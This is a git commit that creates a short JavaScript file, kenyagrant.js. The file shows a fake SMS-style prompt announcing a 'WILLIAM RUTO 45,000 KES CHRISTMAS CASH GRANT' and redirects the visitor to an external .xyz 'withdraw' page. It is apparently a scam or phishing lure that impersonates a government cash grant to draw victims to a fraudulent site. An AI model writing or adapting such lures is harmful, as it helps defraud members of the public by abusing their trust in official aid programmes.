118b7efa5cdf04633b6573af2d78320c16b2a8ab
bigetijazz14 <bigetijazz14@gmail.com>
2024-12-04 05:15:42 -0800

    Create kenyagrant.js

---
+++ kenyagrant.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 45,000 KES'
+password=prompt('SMS: Congratulations, you are eligible for WILLIAM RUTO 45,000 KES CHRISTMAS CASH GRANT FOR ALL, Please press OK to CLAIM Cash Prize','CLAIM 45,000 KES');
+if (password != 'CLAIM 45,000 KES') {
+location.href='https://www.xmas-season.xyz/withdraw-45000KES';
+}
